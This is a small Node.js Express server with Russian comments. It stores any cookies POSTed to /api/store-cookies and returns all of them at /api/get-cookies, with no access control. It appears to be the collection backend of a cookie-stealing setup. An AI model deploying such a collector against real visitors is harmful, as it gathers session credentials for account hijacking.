const express = require('express');
const path = require('path');
const app = express();
const port = 3000;

// Массив для хранения куки
let userCookies = [];

// Настройка для обслуживания статических файлов из папки 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Middleware для обработки JSON-данных
app.use(express.json());

// Маршрут для хранения куки
app.post('/api/store-cookies', (req, res) => {
    console.log('Received request:', req.method, req.url);
    console.log('Request body:', req.body);

    const { cookies } = req.body;
    if (!cookies) {
        return res.status(400).json({ error: 'No cookies provided' });
    }

    userCookies.push(cookies);
    console.log('Cookies stored:', cookies);
    console.log('Current userCookies:', userCookies);
    res.json({ status: 'success' });
});

// Маршрут для получения куки
app.get('/api/get-cookies', (req, res) => {
    res.json(userCookies);
});

// Отправка главной страницы
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Запуск сервера
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
